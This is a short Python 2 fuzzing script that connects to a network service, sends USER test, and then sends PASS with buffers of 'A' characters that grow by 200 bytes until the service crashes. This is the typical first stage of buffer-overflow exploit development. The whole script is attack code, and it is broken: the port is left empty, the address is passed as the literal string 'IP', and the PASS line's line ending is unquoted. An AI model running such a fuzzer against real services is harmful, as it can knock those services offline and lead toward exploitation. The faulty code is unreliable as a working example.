#!/usr/bin/python
import socket

IP=''
PORT=

#create an array of buffers while incrementig of 200

buffer=["A"]
counter=100
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+200

#send the buffer until the service crashes

for string in buffer:
	print "Fuzzing PASS with %s bytes" % len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('IP' ,PORT))
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('PASS ' + string + \r\n)
	s.send('QUIT\r\n')
	s.close()




